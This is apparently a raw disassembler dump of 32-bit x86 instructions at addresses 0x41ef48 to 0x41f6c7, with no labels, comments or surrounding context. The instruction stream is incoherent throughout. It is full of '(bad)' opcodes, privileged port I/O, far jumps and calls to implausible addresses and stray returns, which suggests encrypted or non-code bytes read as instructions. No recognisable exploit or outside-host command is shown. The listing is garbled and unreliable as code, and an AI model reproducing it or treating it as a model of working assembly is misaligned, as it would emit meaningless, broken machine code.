  41ef48:	fimul  WORD PTR [eax-0x25b8dc7d]
  41ef4e:	add    eax,0xdf84e933
  41ef53:	or     DWORD PTR [ebp+edi*4+0x5f137cf4],eax
  41ef5a:	jmp    0x4cdfe96
  41ef5f:	add    DWORD PTR [esi+ecx*8+0x21],ebx
  41ef63:	icebp  
  41ef64:	and    DWORD PTR [edi-0x6e],0xd5e545b7
  41ef6b:	pop    ecx
  41ef6c:	sub    al,0x48
  41ef6e:	ret    
  41ef6f:	out    dx,eax
  41ef70:	xor    bh,BYTE PTR [esp+edx*2+0x393e3b8b]
  41ef77:	ins    DWORD PTR es:[edi],dx
  41ef78:	push   es
  41ef79:	addps  xmm7,XMMWORD PTR [ecx+0x22096ba]
  41ef80:	ins    DWORD PTR es:[edi],dx
  41ef81:	ja     0x41ef0e
  41ef83:	out    dx,eax
  41ef84:	loopne 0x41efee
  41ef86:	mov    DWORD PTR [edx],esi
  41ef88:	pushf  
  41ef89:	cmp    al,0xf1
  41ef8b:	xchg   DWORD PTR [edx-0x7fb8383d],ebp
  41ef91:	inc    ebx
  41ef92:	(bad)  
  41ef93:	outs   dx,DWORD PTR ds:[esi]
  41ef94:	push   esp
  41ef95:	inc    ecx
  41ef96:	push   edi
  41ef97:	cld    
  41ef98:	retf   
  41ef99:	cmp    DWORD PTR [ebx-0x7cbc0916],0xa2a457c5
  41efa3:	nop    DWORD PTR [edi]
  41efa6:	mov    ebp,0xb752711a
  41efab:	mov    esp,0xf99843d3
  41efb0:	dec    ebx
  41efb1:	in     eax,dx
  41efb2:	ss dec ebx
  41efb4:	leave  
  41efb5:	push   eax
  41efb6:	iret   
  41efb7:	leave  
  41efb8:	fld    DWORD PTR [ecx+0xc]
  41efbb:	push   esp
  41efbc:	mov    cl,0x27
  41efbe:	(bad)  
  41efbf:	xlat   BYTE PTR ds:[ebx]
  41efc0:	out    0x1d,eax
  41efc2:	pop    edx
  41efc3:	stos   BYTE PTR es:[edi],al
  41efc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efc5:	stos   BYTE PTR es:[edi],al
  41efc6:	arpl   si,cx
  41efc8:	rcr    dh,cl
  41efca:	outs   dx,DWORD PTR ds:[esi]
  41efcb:	pop    edi
  41efcc:	cmp    eax,0x1a8039b6
  41efd1:	aas    
  41efd2:	mov    dh,0x3b
  41efd4:	test   al,0x67
  41efd6:	daa    
  41efd7:	inc    eax
  41efd8:	xchg   esi,eax
  41efd9:	loop   0x41efe6
  41efdb:	dec    esi
  41efdc:	in     al,0x6a
  41efde:	sub    eax,0x455cd896
  41efe3:	aaa    
  41efe4:	sar    BYTE PTR [eax],cl
  41efe6:	pushf  
  41efe7:	aam    0x23
  41efe9:	sbb    BYTE PTR [ebx],bh
  41efeb:	data16 jge 0x41efe3
  41efee:	mov    bl,0x9b
  41eff0:	cs push ebx
  41eff2:	add    ebx,DWORD PTR [edx]
  41eff4:	and    cl,bl
  41eff6:	in     al,0x0
  41eff8:	sbb    ch,BYTE PTR [edi]
  41effa:	push   0xd5281d50
  41efff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f000:	ins    BYTE PTR es:[edi],dx
  41f001:	fbld   TBYTE PTR [edx-0x54]
  41f004:	push   eax
  41f005:	mov    BYTE PTR [ebx-0x3185b1f],bh
  41f00b:	jbe    0x41ef93
  41f00d:	push   es
  41f00e:	cwde   
  41f00f:	lods   eax,DWORD PTR ds:[esi]
  41f010:	mov    esp,0xed5d951a
  41f015:	fistp  QWORD PTR [ebx-0x7075ce97]
  41f01b:	pop    esp
  41f01c:	test   al,0x9a
  41f01e:	mov    edx,0x5343ad3e
  41f023:	xchg   DWORD PTR [ebp+edi*1-0x35],eax
  41f027:	pop    edi
  41f028:	(bad)  
  41f029:	(bad)  
  41f02a:	sahf   
  41f02b:	add    eax,0xabd2e4f5
  41f030:	sbb    DWORD PTR [ebx+0x1a],ecx
  41f033:	outs   dx,BYTE PTR ds:[esi]
  41f034:	push   esp
  41f035:	shl    bh,1
  41f037:	cld    
  41f038:	sub    eax,0xe2117c9f
  41f03d:	addr16 ret 
  41f03f:	cmp    eax,0xa987b400
  41f044:	mov    esp,0x43b4d5a3
  41f049:	adc    ebx,esi
  41f04b:	xchg   ecx,eax
  41f04c:	push   0xffffffa2
  41f04e:	xor    BYTE PTR [ebp+0x6d],dh
  41f051:	frstor [ebp-0x25]
  41f054:	lea    ecx,[ecx+edx*8]
  41f057:	scas   eax,DWORD PTR es:[edi]
  41f058:	xchg   esi,eax
  41f059:	add    BYTE PTR [ebp+0x58e0353b],0x4a
  41f060:	xchg   esp,eax
  41f061:	repnz xor edi,DWORD PTR [ebx+ebx*1+0x5]
  41f066:	or     eax,0x9b229ee0
  41f06b:	adc    al,0x7
  41f06d:	and    DWORD PTR [edx-0x4f],eax
  41f070:	inc    ebp
  41f072:	ss mov eax,0x6dd4210
  41f078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f079:	fbld   TBYTE PTR [edx-0x4a]
  41f07c:	int3   
  41f07d:	fdivr  QWORD PTR [ebx]
  41f07f:	xchg   esp,eax
  41f080:	jb     0x41f012
  41f082:	stos   DWORD PTR es:[edi],eax
  41f083:	les    edx,FWORD PTR [edi-0x1a]
  41f086:	test   ah,ah
  41f088:	push   ecx
  41f089:	sbb    DWORD PTR [eax],esp
  41f08b:	jo     0x41f07d
  41f08d:	and    eax,0xb75d751a
  41f092:	push   es
  41f093:	loopne 0x41f0a3
  41f095:	or     DWORD PTR [ebp-0x3122145c],esp
  41f09b:	pop    esi
  41f09c:	repnz mov WORD PTR ss:[edx+0x2c],fs
  41f0a1:	add    ah,BYTE PTR [ebp-0x35]
  41f0a4:	push   0xaf84f4c2
  41f0a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0aa:	sub    DWORD PTR [ecx+0x444dddcc],0x5
  41f0b1:	dec    esp
  41f0b2:	xor    al,0x3
  41f0b4:	adc    edx,eax
  41f0b6:	repz into 
  41f0b8:	lods   eax,DWORD PTR ds:[esi]
  41f0b9:	aas    
  41f0ba:	into   
  41f0bb:	pop    esi
  41f0bc:	jmp    0x41f0fc
  41f0be:	and    BYTE PTR [esi-0xf],dl
  41f0c1:	outs   dx,DWORD PTR ds:[esi]
  41f0c2:	mov    ecx,0xfc9d1235
  41f0c7:	pushf  
  41f0c8:	fcom   st(6)
  41f0ca:	iret   
  41f0cb:	dec    esp
  41f0cc:	and    BYTE PTR [edi+0x1db40763],dl
  41f0d2:	in     eax,0x94
  41f0d4:	push   0x51fa9be4
  41f0d9:	dec    eax
  41f0da:	call   0x541a822b
  41f0df:	es js  0x41f0ef
  41f0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0e3:	sbb    eax,0x963582f
  41f0e8:	neg    BYTE PTR [ebp+0x50a322a4]
  41f0ee:	fiadd  WORD PTR [ebx+0x1df08840]
  41f0f4:	loop   0x41f128
  41f0f6:	scas   al,BYTE PTR es:[edi]
  41f0f7:	or     ecx,edi
  41f0f9:	mov    ah,0x8a
  41f0fb:	int3   
  41f0fc:	cwde   
  41f0fd:	sbb    eax,DWORD PTR [ecx+0x41]
  41f100:	sbb    eax,0xbd08cf89
  41f105:	cdq    
  41f106:	shl    BYTE PTR [ebp-0x41a0391f],1
  41f10c:	push   ds
  41f10d:	nop
  41f10e:	sbb    al,BYTE PTR [edx-0x48]
  41f111:	adc    eax,ebp
  41f113:	stc    
  41f114:	bound  ebx,QWORD PTR [ebx]
  41f116:	sbb    eax,0x312301e7
  41f11b:	mov    al,0x98
  41f11d:	dec    eax
  41f11e:	dec    ebp
  41f11f:	sub    BYTE PTR ds:0xf1c7f8c5,dl
  41f125:	push   edi
  41f126:	xor    eax,0x5d50156
  41f12b:	sti    
  41f12c:	sub    BYTE PTR ds:0xeb73be17,dl
  41f132:	mov    dh,0x1e
  41f134:	in     eax,dx
  41f135:	addr16 inc esi
  41f137:	loope  0x41f181
  41f139:	and    DWORD PTR [edx+0x183b56c3],0x299cf7bc
  41f143:	dec    eax
  41f144:	ficomp DWORD PTR [ebp+0x1870376d]
  41f14a:	mov    ss,WORD PTR [ecx+0xf]
  41f14d:	push   0x3f8a338e
  41f152:	sub    bh,BYTE PTR ds:0xb62bf613
  41f158:	mov    dh,0xca
  41f15a:	scas   eax,DWORD PTR es:[edi]
  41f15b:	sbb    eax,0x7486ec21
  41f160:	xchg   DWORD PTR [edi],ebp
  41f162:	xor    al,0xdc
  41f164:	addr16 in eax,dx
  41f166:	gs xchg edi,eax
  41f168:	(bad)  
  41f16a:	or     esi,ebx
  41f16c:	cli    
  41f16d:	adc    bl,ch
  41f16f:	cwde   
  41f170:	aam    0x4b
  41f172:	scas   al,BYTE PTR es:[edi]
  41f173:	mul    BYTE PTR [esi+ecx*8-0x6a]
  41f177:	std    
  41f178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f179:	xor    DWORD PTR [esi+0x59],ebx
  41f17c:	and    BYTE PTR [edx-0x29201d6],cl
  41f182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f183:	sub    eax,0x510f3836
  41f188:	ret    
  41f189:	mov    ecx,DWORD PTR [esi]
  41f18b:	test   al,0xd9
  41f18d:	leave  
  41f18e:	jmp    0x7dc774ed
  41f193:	cmc    
  41f194:	push   es
  41f195:	(bad)  
  41f196:	sbb    dh,BYTE PTR [esi-0x78fc344a]
  41f19c:	test   al,0x5f
  41f19e:	jmp    0xf85b:0x703a41aa
  41f1a5:	icebp  
  41f1a6:	(bad)  
  41f1a7:	call   0xb2d85f01
  41f1ac:	add    eax,edi
  41f1ae:	vpcmpeqb ymm7,ymm2,YMMWORD PTR [edx]
  41f1b2:	dec    ecx
  41f1b3:	(bad)  
  41f1b4:	push   ds
  41f1b5:	inc    ecx
  41f1b6:	jbe    0x41f1a3
  41f1b8:	mov    dh,0xa0
  41f1ba:	sahf   
  41f1bb:	sub    BYTE PTR [ebp+0x7a954e3c],ch
  41f1c1:	pop    es
  41f1c2:	cmp    ebx,edi
  41f1c4:	and    esp,edx
  41f1c6:	loop   0x41f1bf
  41f1c8:	xchg   BYTE PTR [ebp+0x4ca6a05d],dh
  41f1ce:	or     dl,BYTE PTR [ebx+0x61341e32]
  41f1d4:	pop    esi
  41f1d5:	gs jecxz 0x41f18d
  41f1d8:	out    0x63,eax
  41f1da:	mov    al,0xa1
  41f1dc:	call   0x4ac6499
  41f1e1:	adc    eax,0xb46f0784
  41f1e6:	fbld   TBYTE PTR [ecx]
  41f1e8:	shl    BYTE PTR ds:0x300b294e,1
  41f1ee:	lock push 0x20
  41f1f1:	mov    ds:0x490795c4,al
  41f1f6:	pop    ebp
  41f1f7:	lea    esi,[ecx+0x11]
  41f1fa:	mov    DWORD PTR [ebp+0x5fddd5c9],ebp
  41f200:	or     bh,dl
  41f202:	and    DWORD PTR [ecx],esp
  41f204:	data16 adc al,0x6d
  41f207:	cdq    
  41f208:	call   0xa35:0x7fc7366a
  41f20f:	in     eax,0xfc
  41f211:	scas   eax,DWORD PTR es:[edi]
  41f212:	inc    esp
  41f213:	mov    ah,0x8
  41f215:	enter  0xeda6,0xd2
  41f219:	retf   0x631e
  41f21c:	out    dx,eax
  41f21d:	xor    DWORD PTR ds:0xe98694bc,edi
  41f223:	sbb    bl,BYTE PTR [ebx+edx*2]
  41f226:	std    
  41f227:	fdivr  st(2),st
  41f229:	lds    ebx,FWORD PTR [ebp-0x3]
  41f22c:	mov    ecx,0x281d15d0
  41f231:	push   0xe
  41f233:	jle    0x41f1e9
  41f235:	test   ecx,ebp
  41f237:	loopne 0x41f215
  41f239:	gs mov ch,0x6c
  41f23c:	ss xchg esi,eax
  41f23e:	cwde   
  41f23f:	mov    DWORD PTR [esi-0x2c9dd7c5],edx
  41f245:	jp     0x41f251
  41f247:	iret   
  41f248:	in     eax,dx
  41f249:	add    BYTE PTR gs:[eax+0x24fcc559],bl
  41f250:	inc    ebx
  41f251:	mov    dh,0x4a
  41f253:	jo     0x41f1e3
  41f255:	sbb    ah,BYTE PTR [esi+0x7c]
  41f258:	push   esp
  41f259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f25a:	push   0x928f32b8
  41f25f:	inc    esp
  41f260:	lock cmp DWORD PTR [edx+0x727236d3],eax
  41f267:	call   0x96a:0xb663fba1
  41f26e:	test   al,0x9f
  41f270:	in     al,0x69
  41f272:	shl    DWORD PTR [esp+ecx*2+0x27741328],1
  41f279:	push   ebx
  41f27a:	cmp    eax,0x41fd9c6b
  41f27f:	and    al,0xc
  41f281:	aam    0xfa
  41f283:	test   eax,0x36159786
  41f288:	push   eax
  41f289:	scas   eax,DWORD PTR es:[edi]
  41f28a:	test   ebp,ebx
  41f28c:	sbb    esp,edx
  41f28e:	mov    al,0x31
  41f290:	fwait
  41f291:	lock jno 0x41f26f
  41f294:	in     eax,0xe9
  41f296:	fimul  WORD PTR [eax]
  41f298:	adc    dl,BYTE PTR [ebp+0x3d]
  41f29b:	in     eax,dx
  41f29c:	inc    eax
  41f29d:	icebp  
  41f29e:	sub    eax,0xc5e9422f
  41f2a3:	loopne 0x41f2dc
  41f2a5:	push   ds
  41f2a6:	ss inc ebx
  41f2a8:	push   ebp
  41f2a9:	push   ds
  41f2aa:	fbld   TBYTE PTR [edx+0x5eb747d1]
  41f2b0:	jnp    0x41f306
  41f2b2:	lds    edi,FWORD PTR [esi-0x2e]
  41f2b5:	inc    ebx
  41f2b6:	(bad)  
  41f2b7:	aam    0xd4
  41f2b9:	adc    eax,0x58e336a8
  41f2be:	popf   
  41f2bf:	or     eax,0xc4921871
  41f2c4:	scas   eax,DWORD PTR es:[edi]
  41f2c5:	push   eax
  41f2c6:	ds cmp eax,0x2f36e19a
  41f2cc:	xor    al,0xf4
  41f2ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2cf:	scas   eax,DWORD PTR es:[edi]
  41f2d0:	add    BYTE PTR [ecx+edi*4+0x50f9ae0d],cl
  41f2d7:	fwait
  41f2d8:	lods   eax,DWORD PTR ds:[esi]
  41f2d9:	mov    ?,WORD PTR [edi]
  41f2db:	btr    DWORD PTR [ecx+0x55fd8089],eax
  41f2e2:	in     eax,dx
  41f2e3:	mov    edx,0xa0d9b982
  41f2e8:	shr    cl,0xf
  41f2eb:	shl    BYTE PTR [ecx+ecx*8+0x7136fe73],0x1f
  41f2f3:	jmp    0x72215e1e
  41f2f8:	and    al,dl
  41f2fa:	xor    BYTE PTR [ecx+eax*2+0x24],al
  41f2fe:	sub    ah,cl
  41f300:	add    DWORD PTR [ebx],ebx
  41f302:	cld    
  41f303:	ds je  0x41f32f
  41f306:	dec    eax
  41f307:	call   0x1e03d406
  41f30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f30d:	inc    edi
  41f30e:	je     0x41f2c7
  41f310:	inc    ebp
  41f311:	inc    eax
  41f312:	sub    esi,eax
  41f314:	daa    
  41f315:	mov    edi,0x5f790792
  41f31a:	mov    edx,0x489ede74
  41f31f:	rcl    DWORD PTR [ebx+ebp*2-0x63],1
  41f323:	jle    0x41f2dd
  41f325:	pop    esp
  41f326:	and    DWORD PTR [edx+ebx*4+0xf91c6a9],ebx
  41f32d:	dec    eax
  41f32e:	mov    dl,0x7a
  41f330:	addr16 pushf 
  41f332:	mov    DWORD PTR [edx+0xd16f160],ecx
  41f338:	in     al,dx
  41f339:	mov    bh,0x39
  41f33b:	pop    es
  41f33c:	push   eax
  41f33d:	and    eax,0x47714523
  41f342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f343:	xor    eax,0xa7d78389
  41f348:	and    eax,0xdf7d36da
  41f34d:	inc    esi
  41f34e:	ret    
  41f34f:	push   ecx
  41f350:	cs xchg ebp,eax
  41f352:	jecxz  0x41f2fd
  41f354:	sahf   
  41f355:	inc    ebp
  41f356:	adc    eax,0x56511d4
  41f35b:	push   0xffffffe7
  41f35d:	outs   dx,BYTE PTR ds:[esi]
  41f35e:	fisubr WORD PTR [ecx-0x59c87a84]
  41f364:	loope  0x41f3bd
  41f366:	lods   al,BYTE PTR ds:[esi]
  41f367:	out    dx,al
  41f368:	cld    
  41f369:	inc    ebx
  41f36a:	dec    eax
  41f36b:	(bad)  
  41f36c:	(bad)  
  41f36d:	les    edi,FWORD PTR [eax]
  41f36f:	sbb    ecx,edi
  41f371:	xlat   BYTE PTR ds:[ebx]
  41f372:	sbb    al,BYTE PTR [edx+0x7e]
  41f375:	cli    
  41f376:	xlat   BYTE PTR ds:[ebx]
  41f377:	mov    bh,0x74
  41f379:	xchg   ebx,eax
  41f37a:	pop    ss
  41f37b:	sahf   
  41f37c:	setl   BYTE PTR [esi+0x3c4f1d69]
  41f383:	repnz push edx
  41f385:	mov    esi,0x31beba78
  41f38a:	push   ebx
  41f38b:	loop   0x41f31a
  41f38d:	loop   0x41f3f1
  41f38f:	dec    eax
  41f390:	pop    ecx
  41f391:	inc    esp
  41f392:	int    0x73
  41f394:	jno    0x41f38e
  41f396:	xchg   esi,eax
  41f397:	outs   dx,BYTE PTR ds:[esi]
  41f398:	adc    eax,0xaa10d89d
  41f39d:	push   edi
  41f39e:	and    al,dh
  41f3a0:	ss inc edi
  41f3a2:	inc    ebp
  41f3a3:	xor    DWORD PTR [esp+eax*4-0x3299ae07],ebp
  41f3aa:	js     0x41f366
  41f3ac:	jbe    0x41f3bb
  41f3ae:	fist   DWORD PTR [eax-0x73]
  41f3b1:	dec    ecx
  41f3b2:	push   ebp
  41f3b3:	mov    ah,0xd7
  41f3b5:	adc    ebx,DWORD PTR [edi]
  41f3b7:	mov    cl,0xa
  41f3b9:	xor    al,0x9f
  41f3bb:	xchg   BYTE PTR [eax-0x2f],bl
  41f3be:	leave  
  41f3bf:	sbb    DWORD PTR [eax-0x29f8ecb9],esp
  41f3c5:	cwde   
  41f3c6:	sub    eax,0x4789a6ad
  41f3cb:	or     edx,edi
  41f3cd:	jno    0x41f3e2
  41f3cf:	add    DWORD PTR [edi+ebx*8-0x580e8967],ecx
  41f3d6:	retf   
  41f3d7:	dec    ecx
  41f3d8:	pop    es
  41f3d9:	repnz test DWORD PTR [eax-0x5dabc59c],eax
  41f3e0:	sbb    eax,0x862f9839
  41f3e5:	xlat   BYTE PTR ds:[ebx]
  41f3e6:	push   ecx
  41f3e7:	neg    BYTE PTR [edi]
  41f3e9:	dec    esi
  41f3ea:	bound  edi,QWORD PTR [ecx]
  41f3ec:	and    BYTE PTR [edi-0x3e22a6c6],0x66
  41f3f3:	jecxz  0x41f413
  41f3f5:	pop    ecx
  41f3f6:	pop    edi
  41f3f7:	retf   
  41f3f8:	std    
  41f3f9:	test   ah,dl
  41f3fb:	xchg   ebx,eax
  41f3fc:	sub    esi,DWORD PTR [esi]
  41f3fe:	fist   DWORD PTR fs:0xf0b61a27
  41f405:	call   0x22af3f0b
  41f40a:	iret   
  41f40b:	mov    bl,0x6
  41f40d:	add    al,BYTE PTR [ebp-0x6fcd1565]
  41f413:	into   
  41f414:	pop    esi
  41f415:	call   0x386d005d
  41f41a:	add    dh,BYTE PTR [esi-0x4607ace9]
  41f420:	data16 or BYTE PTR [bx+di+0x60],0x23
  41f426:	test   DWORD PTR [esi+edx*8+0x7d],edi
  41f42a:	push   edx
  41f42b:	repz fstp st(2)
  41f42e:	mov    edx,0x52ab1bf0
  41f433:	int3   
  41f434:	sbb    eax,0xbbc9140e
  41f439:	push   esp
  41f43a:	jo     0x41f439
  41f43c:	xor    esp,DWORD PTR [edi+0x6c]
  41f43f:	loop   0x41f3f4
  41f441:	mov    dh,0xd2
  41f443:	inc    eax
  41f444:	ins    DWORD PTR es:[edi],dx
  41f445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f446:	mov    edi,0x8839a1ec
  41f44b:	pushf  
  41f44c:	and    ecx,ecx
  41f44e:	retf   0x373f
  41f451:	push   0x89e02eed
  41f456:	cld    
  41f457:	aaa    
  41f458:	pop    esp
  41f459:	and    al,0xb9
  41f45b:	xor    eax,0x4194af87
  41f460:	sti    
  41f461:	jno    0x41f414
  41f463:	sti    
  41f464:	push   edi
  41f465:	xor    bh,BYTE PTR [edx-0x10]
  41f468:	sbb    esp,ecx
  41f46a:	out    dx,eax
  41f46b:	gs mov ch,0x46
  41f46e:	daa    
  41f46f:	fwait
  41f470:	cli    
  41f471:	and    edi,ebx
  41f473:	inc    esi
  41f474:	xchg   esi,eax
  41f475:	xor    esi,ebp
  41f477:	sub    ch,al
  41f479:	cmp    BYTE PTR [ebx-0x2886a5a0],dh
  41f47f:	lahf   
  41f480:	sbb    ah,bh
  41f482:	and    eax,0x79f4f8cb
  41f487:	fdivrp st(1),st
  41f489:	out    0xa7,al
  41f48b:	les    esi,FWORD PTR fs:[ebx]
  41f48e:	leave  
  41f48f:	mov    ebp,ds
  41f491:	nop
  41f492:	mov    es,WORD PTR [esi]
  41f494:	scas   eax,DWORD PTR es:[edi]
  41f495:	cmc    
  41f496:	push   ss
  41f497:	add    al,0x9a
  41f499:	adc    ecx,DWORD PTR [ecx+0x69ed8e50]
  41f49f:	lahf   
  41f4a0:	retf   
  41f4a1:	test   eax,0x120d06eb
  41f4a6:	ret    
  41f4a7:	pop    es
  41f4a8:	push   cs
  41f4a9:	xchg   ebp,eax
  41f4aa:	adc    al,0x8f
  41f4ac:	dec    esp
  41f4ad:	aam    0x92
  41f4af:	add    al,0x8c
  41f4b1:	jbe    0x41f4cb
  41f4b3:	rol    BYTE PTR [edi-0x8d1a45e],cl
  41f4b9:	push   ecx
  41f4ba:	push   ecx
  41f4bb:	dec    eax
  41f4bc:	(bad)  
  41f4bd:	fmul   DWORD PTR [ecx-0x6afb25f1]
  41f4c3:	je     0x41f512
  41f4c5:	xor    dl,0xf6
  41f4c8:	ficomp WORD PTR [edi+0x4d991751]
  41f4ce:	int3   
  41f4cf:	xchg   esi,eax
  41f4d0:	cdq    
  41f4d1:	mov    esp,0xf260d3eb
  41f4d6:	jbe    0x41f4cf
  41f4d8:	dec    eax
  41f4d9:	jo     0xd9926097
  41f4df:	add    ebp,edi
  41f4e1:	push   ebx
  41f4e2:	push   cs
  41f4e3:	pop    ds
  41f4e4:	fist   DWORD PTR [ebx-0x3923f6ec]
  41f4ea:	lea    edi,[ecx-0x559a0453]
  41f4f0:	sti    
  41f4f1:	pop    ds
  41f4f2:	lahf   
  41f4f3:	das    
  41f4f4:	and    al,0xf5
  41f4f6:	xchg   esi,eax
  41f4f7:	and    dl,dh
  41f4f9:	nop
  41f4fa:	mov    edx,0xcd7fbb27
  41f4ff:	icebp  
  41f500:	shr    ch,0x7d
  41f503:	cmp    BYTE PTR [ecx-0x1e],cl
  41f506:	jp     0x41f527
  41f508:	daa    
  41f509:	inc    edi
  41f50a:	push   edx
  41f50b:	mov    dl,0xbb
  41f50d:	cmp    edx,DWORD PTR [esi+0x115114b1]
  41f513:	push   ebp
  41f514:	mov    ch,0x8b
  41f516:	dec    ebx
  41f517:	(bad)
  41f51a:	add    dh,BYTE PTR [ecx]
  41f51c:	mov    bh,0x94
  41f51e:	(bad)  
  41f520:	inc    esp
  41f521:	call   0x35cc0972
  41f526:	adc    ecx,ebp
  41f528:	ss xor al,0xc4
  41f52b:	inc    eax
  41f52c:	push   es
  41f52d:	leave  
  41f52e:	in     eax,dx
  41f52f:	push   0x39
  41f531:	cld    
  41f532:	push   0x7
  41f534:	loop   0x41f5af
  41f536:	(bad)  
  41f538:	add    al,0xc5
  41f53a:	ds mov al,0xe5
  41f53d:	cwde   
  41f53e:	das    
  41f53f:	hlt    
  41f540:	ja     0x41f551
  41f542:	ss lahf 
  41f544:	jle    0x41f5b4
  41f546:	int3   
  41f547:	cmp    esp,DWORD PTR [edi-0x5e]
  41f54a:	ret    
  41f54b:	sub    eax,0x82527db0
  41f550:	pop    esp
  41f551:	pop    esp
  41f552:	jge    0x41f53c
  41f554:	fcomp  DWORD PTR [esp+esi*4-0x3101125c]
  41f55b:	mov    ds:0x5bf03a41,eax
  41f560:	popa   
  41f561:	xchg   BYTE PTR [ecx+edx*1-0x51d1f467],dl
  41f568:	ss pusha 
  41f56a:	mov    bl,0xee
  41f56c:	fsub   DWORD PTR [edi+0x17348abe]
  41f572:	sub    eax,0x665267c5
  41f577:	sub    edi,ecx
  41f579:	in     al,0x45
  41f57b:	loopne 0x41f513
  41f57d:	xchg   esp,eax
  41f57e:	dec    edi
  41f57f:	stos   DWORD PTR es:[edi],eax
  41f580:	fld    TBYTE PTR [esi]
  41f582:	idiv   BYTE PTR [edi+0x4ea1ab83]
  41f588:	jo     0x41f56c
  41f58a:	jns    0x41f59f
  41f58c:	mov    dh,0xc1
  41f58e:	push   esi
  41f58f:	mov    ebx,0xfef04597
  41f594:	retf   0xa754
  41f597:	ret    0xd155
  41f59a:	inc    edx
  41f59b:	sub    BYTE PTR [esi+edx*1-0x4],cl
  41f59f:	fs xchg ecx,eax
  41f5a1:	adc    bl,BYTE PTR [ecx+0x74]
  41f5a4:	hlt    
  41f5a5:	sub    BYTE PTR [esi-0x7897f7b3],ch
  41f5ab:	push   esi
  41f5ac:	inc    eax
  41f5ad:	cmp    ebx,edi
  41f5af:	cdq    
  41f5b0:	and    dl,BYTE PTR [edx+0x7a7fa6f4]
  41f5b6:	mov    BYTE PTR [edi],cl
  41f5b8:	fisttp DWORD PTR ds:[esi+0xb]
  41f5bc:	sub    dl,BYTE PTR [esi]
  41f5be:	sub    BYTE PTR [eax+0x7e2a7429],0x49
  41f5c5:	std    
  41f5c6:	xor    ch,BYTE PTR [edi-0x3017baa6]
  41f5cc:	or     edi,edi
  41f5ce:	bound  ecx,QWORD PTR [edx]
  41f5d0:	or     al,0x2a
  41f5d2:	(bad)  
  41f5d4:	add    BYTE PTR [ebx-0x61],ch
  41f5d7:	adc    eax,0x82252f1f
  41f5dc:	rol    BYTE PTR [ecx],0xc
  41f5df:	stos   BYTE PTR es:[edi],al
  41f5e0:	test   BYTE PTR [ebp+0x52],dh
  41f5e3:	(bad)  
  41f5e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5e5:	rol    DWORD PTR [ebp-0x45fe068a],0x24
  41f5ec:	enter  0xb1e5,0xc1
  41f5f0:	out    0xd1,eax
  41f5f2:	dec    esi
  41f5f3:	mov    edx,0xebdaa685
  41f5f8:	pop    ds
  41f5f9:	mov    ah,0xcd
  41f5fb:	ficomp WORD PTR [esp+ebx*4]
  41f5fe:	out    0x1d,al
  41f600:	mov    eax,ds:0xe9609b9b
  41f605:	cmp    BYTE PTR [esi+ecx*1+0x60],0xc2
  41f60a:	das    
  41f60b:	jl     0x41f62c
  41f60d:	(bad)  
  41f60e:	xor    BYTE PTR [esi-0x60b99c6a],dh
  41f614:	sahf   
  41f615:	sbb    ah,cl
  41f617:	mov    ebp,0x309e4123
  41f61c:	push   edi
  41f61d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f61e:	jle    0x41f68d
  41f620:	add    BYTE PTR [edi+0x19],dl
  41f623:	sbb    DWORD PTR [esi+eiz*1+0x1d],edi
  41f627:	inc    eax
  41f628:	xlat   BYTE PTR ds:[ebx]
  41f629:	push   edx
  41f62a:	cdq    
  41f62b:	dec    DWORD PTR [ecx]
  41f62d:	mov    dl,dh
  41f62f:	mov    dl,0xac
  41f631:	(bad)  
  41f632:	mov    edx,0xe76e429
  41f637:	pop    esp
  41f638:	add    ah,BYTE PTR [esi-0x7f0486d6]
  41f63e:	mov    dl,0x69
  41f640:	retf   0x3a87
  41f643:	test   DWORD PTR [esi+0xd],esp
  41f646:	es mov ah,0x43
  41f649:	ret    0xa310
  41f64c:	mov    dh,0x8c
  41f64e:	push   ebp
  41f64f:	fdiv   DWORD PTR [ecx+eiz*4+0x4aa6d491]
  41f656:	cs (bad) 
  41f658:	fisttp DWORD PTR [ecx-0x23d300d0]
  41f65e:	rcl    ch,cl
  41f660:	test   al,0xde
  41f662:	lea    edi,[ecx+eiz*1+0x3c]
  41f666:	inc    sp
  41f668:	movlps QWORD PTR [edx],xmm2
  41f66b:	xchg   edi,eax
  41f66c:	xchg   DWORD PTR [edx+0x4cfae9ed],ecx
  41f672:	adc    DWORD PTR [esi],ebp
  41f674:	cmp    DWORD PTR [ecx*8+0x7ec47604],ebx
  41f67b:	push   ebp
  41f67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f67d:	cmp    DWORD PTR [ebx-0xc],ecx
  41f680:	adc    DWORD PTR [ebx],edi
  41f682:	rcl    BYTE PTR [esi+0x3fab706c],0x85
  41f689:	pushf  
  41f68a:	xlat   BYTE PTR ds:[ebx]
  41f68b:	call   0xa32a2e1a
  41f690:	mov    al,0x3d
  41f692:	mov    esp,0x594696c2
  41f697:	pop    ss
  41f698:	ja     0x41f6a0
  41f69a:	jge    0x41f660
  41f69c:	loop   0x41f70a
  41f69e:	inc    edx
  41f69f:	jb     0x41f640
  41f6a1:	xchg   esp,eax
  41f6a2:	sub    WORD PTR [edx-0x78],si
  41f6a6:	xchg   ebp,eax
  41f6a7:	or     DWORD PTR [eax-0x12],esp
  41f6aa:	(bad)  
  41f6ac:	dec    edx
  41f6ad:	in     eax,0x25
  41f6af:	mov    DWORD PTR [ebx-0x9],edx
  41f6b2:	mov    bl,BYTE PTR [edx]
  41f6b4:	jecxz  0x41f68d
  41f6b6:	mov    dl,0x59
  41f6b8:	cmp    bl,BYTE PTR [ebx]
  41f6ba:	vandnps ymm4,ymm6,ymm3
  41f6be:	mov    al,ds:0x33e83370
  41f6c3:	scas   al,BYTE PTR es:[edi]
  41f6c4:	sub    BYTE PTR [esi],0x15
  41f6c7:	inc    ebx
